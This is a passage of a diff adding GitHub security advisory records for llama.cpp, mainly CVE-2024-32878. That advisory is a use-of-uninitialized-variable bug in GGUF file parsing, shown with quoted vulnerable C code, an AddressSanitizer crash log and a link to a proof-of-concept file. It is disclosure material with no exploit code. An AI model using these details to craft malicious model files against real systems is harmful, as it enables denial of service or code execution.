+          "events_url": "https://api.github.com/users/Arashimu/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Arashimu/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
+      "score": 5.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-p5mv-gjc5-mwqv",
+    "cve_id": "CVE-2024-32878",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-p5mv-gjc5-mwqv",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-p5mv-gjc5-mwqv",
+    "summary": "Use of Uninitialized Variable Vulnerability in gguf_init_from_file",
+    "description": "### Summary\r\nThere is a use of uninitialized heap variable vulnerability in gguf_init_from_file, the code will free this uninitialized variable later. In a simple POC, it will directly cause a crash. If the file is carefully constructed, it may be possible to control this uninitialized value and cause arbitrary address free problems. This may further lead to be exploited.\r\n\r\n### Details\r\nIn switch case kv->type == GGUF_TYPE_ARRAY, it will malloc an array of heap chunks to store the data, and the pointers will be stored at `kv->value.arr.data`, like GGUF_TYPE_STRING:\r\n```\r\n                            case GGUF_TYPE_STRING:\r\n                                {\r\n                                    // prevent from integer overflow in the malloc below\r\n                                    if (kv->value.arr.n >= SIZE_MAX/sizeof(struct gguf_str)) {\r\n                                        fprintf(stderr, \"%s: array size is too large (%\" PRIu64 \")\\n\", __func__, kv->value.arr.n);\r\n                                        fclose(file);\r\n                                        gguf_free(ctx);\r\n                                        return NULL;\r\n                                    }\r\n\r\n                                    kv->value.arr.data = GGML_MALLOC(kv->value.arr.n * sizeof(struct gguf_str));\r\n\r\n                                    for (uint64_t j = 0; j < kv->value.arr.n; ++j) {\r\n                                        ok = ok && gguf_fread_str(file, &((struct gguf_str *) kv->value.arr.data)[j], &offset);\r\n                                    }\r\n                                } break;\r\n```\r\nin `gguf_fread_str`, the code may return directly without executing malloc and storing pointer.\r\n```\r\nstatic bool gguf_fread_str(FILE * file, struct gguf_str * p, size_t * offset) {\r\n    p->n    = 0;\r\n    p->data = NULL;\r\n\r\n    bool ok = true;\r\n\r\n    ok = ok && gguf_fread_el(file, &p->n, sizeof(p->n), offset);\r\n\r\n    // early exit if string length is invalid, prevents from integer overflow\r\n    if (p->n == SIZE_MAX) {\r\n        fprintf(stderr, \"%s: invalid string length (%\" PRIu64 \")\\n\", __func__, p->n);\r\n        return false;\r\n    }\r\n\r\n    p->data = GGML_CALLOC(p->n + 1, 1);\r\n\r\n    ok = ok && gguf_fread_el(file,  p->data, p->n, offset);\r\n\r\n    return ok;\r\n}\r\n```\r\nThen when the program executes to any `gguf_free(ctx);`, it will cause a free of this uninitialized variable.\r\n```\r\n            if (kv->type == GGUF_TYPE_ARRAY) {\r\n                if (kv->value.arr.data) {\r\n                    if (kv->value.arr.type == GGUF_TYPE_STRING) {\r\n                        for (uint64_t j = 0; j < kv->value.arr.n; ++j) {\r\n                            struct gguf_str * str = &((struct gguf_str *) kv->value.arr.data)[j];\r\n                            if (str->data) {\r\n                                GGML_FREE(str->data);\r\n                            }\r\n                        }\r\n                    }\r\n                    GGML_FREE(kv->value.arr.data);\r\n                }\r\n            }\r\n```\r\n\r\n![Snipaste_2024-04-24_00-42-34](https://github.com/ggerganov/llama.cpp/assets/43723722/3d1b0a4e-8cad-4344-a444-d3b74b3b483f)\r\n\r\nASAN Log\r\n```\r\n\u279c  llama.cpp git:(master) \u2717 ./main -m seeds_dir/obsidian-q6.gguf1 -p \"hello\" -n 400 -e\r\nLog start\r\nmain: build = 2277 (cbbd1efa)\r\nmain: built with cc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 for x86_64-linux-gnu\r\nmain: seed  = 1713891244\r\ngguf_init_from_file: failed to read key-value pairs\r\nAddressSanitizer:DEADLYSIGNAL\r\n=================================================================\r\n==20337==ERROR: AddressSanitizer: BUS on unknown address 0x000000000000 (pc 0x7f963e379a16 bp 0xbebebebebebebeae sp 0x7ffe29c7a820 T0)\r\n    #0 0x7f963e379a15 in bool __sanitizer::atomic_compare_exchange_strong<__sanitizer::atomic_uint8_t>(__sanitizer::atomic_uint8_t volatile*, __sanitizer::atomic_uint8_t::Type*, __sanitizer::atomic_uint8_t::Type, __sanitizer::memory_order) ../../../../src/libsanitizer/sanitizer_common/sanitizer_atomic_clang.h:79\r\n    #1 0x7f963e379a15 in __asan::Allocator::AtomicallySetQuarantineFlagIfAllocated(__asan::AsanChunk*, void*, __sanitizer::BufferedStackTrace*) ../../../../src/libsanitizer/asan/asan_allocator.cc:552\r\n    #2 0x7f963e379a15 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) ../../../../src/libsanitizer/asan/asan_allocator.cc:629\r\n    #3 0x7f963e379a15 in __asan::asan_free(void*, __sanitizer::BufferedStackTrace*, __asan::AllocType) ../../../../src/libsanitizer/asan/asan_allocator.cc:865\r\n    #4 0x7f963e45e3d8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:127\r\n    #5 0x5573c99f4067 in gguf_free (/home/abc/llama.cpp/main+0x13c067)\r\n    #6 0x5573c99f5827 in gguf_init_from_file (/home/abc/llama.cpp/main+0x13d827)\r\n    #7 0x5573c9bb465c in llama_model_loader::llama_model_loader(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, bool, llama_model_kv_override const*) (/home/abc/llama.cpp/main+0x2fc65c)\r\n    #8 0x5573c9b0e354 in llama_model_load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, llama_model&, llama_model_params&) (/home/abc/llama.cpp/main+0x256354)\r\n    #9 0x5573c9b11cfb in llama_load_model_from_file (/home/abc/llama.cpp/main+0x259cfb)\r\n    #10 0x5573c9bd825c in llama_init_from_gpt_params(gpt_params&) (/home/abc/llama.cpp/main+0x32025c)\r\n    #11 0x5573c9941dd0 in main (/home/abc/llama.cpp/main+0x89dd0)\r\n    #12 0x7f963de14082 in __libc_start_main ../csu/libc-start.c:308\r\n    #13 0x5573c995a2cd in _start (/home/abc/llama.cpp/main+0xa22cd)\r\n\r\nAddressSanitizer can not provide additional info.\r\nSUMMARY: AddressSanitizer: BUS ../../../../src/libsanitizer/sanitizer_common/sanitizer_atomic_clang.h:79 in bool __sanitizer::atomic_compare_exchange_strong<__sanitizer::atomic_uint8_t>(__sanitizer::atomic_uint8_t volatile*, __sanitizer::atomic_uint8_t::Type*, __sanitizer::atomic_uint8_t::Type, __sanitizer::memory_order)\r\n==20337==ABORTING\r\n```\r\n\r\n### PoC\r\nhttps://drive.google.com/file/d/1ym_GlXSI3edGVtHzTK-LTcJScSPMoauX/view?usp=sharing\r\n\r\n### Impact\r\nCauses llama.cpp to crash (DoS) and may even lead to arbitrary code execution (RCE).\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-p5mv-gjc5-mwqv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-32878",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-04-26T10:17:10Z",
+    "published_at": "2024-04-26T10:17:10Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "llama.cpp"
+        },
+        "vulnerable_version_range": "b2715",
+        "patched_versions": "b2740",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L",
+        "score": 7.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [
+      {
+        "login": "DanisJiang",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "DanisJiang",
+          "id": 43723722,
+          "node_id": "MDQ6VXNlcjQzNzIzNzIy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/43723722?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/DanisJiang",
+          "html_url": "https://github.com/DanisJiang",
+          "followers_url": "https://api.github.com/users/DanisJiang/followers",
+          "following_url": "https://api.github.com/users/DanisJiang/following{/other_user}",
+          "gists_url": "https://api.github.com/users/DanisJiang/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/DanisJiang/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/DanisJiang/subscriptions",
+          "organizations_url": "https://api.github.com/users/DanisJiang/orgs",
+          "repos_url": "https://api.github.com/users/DanisJiang/repos",
+          "events_url": "https://api.github.com/users/DanisJiang/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/DanisJiang/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 12,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L",
+      "score": 7.1
+    }
+  }
+]
